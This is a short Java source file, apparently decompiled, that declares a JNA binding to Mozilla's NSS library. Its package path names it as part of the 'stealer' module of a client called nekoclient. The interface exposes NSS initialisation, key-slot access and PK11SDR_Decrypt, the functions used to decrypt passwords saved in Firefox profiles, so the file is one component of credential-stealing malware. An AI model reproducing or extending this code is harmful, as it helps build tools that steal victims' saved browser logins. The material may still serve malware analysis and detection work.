package dev.neko.nekoclient.api.stealer.browser.impl.decrypt.mozilla;

import com.sun.jna.Library;
import com.sun.jna.ptr.PointerByReference;

public interface NSSLibrary extends Library {
   void NSS_Init(String var1);

   int PK11_GetInternalKeySlot(PointerByReference var1);

   int PK11_FreeSlot(PointerByReference var1);

   int PK11_NeedLogin(PointerByReference var1);

   int PK11SDR_Decrypt(SECItem var1, SECItem var2, PointerByReference var3);

   void SECITEM_ZfreeItem(SECItem var1, int var2);

   void NSS_Shutdown();
}
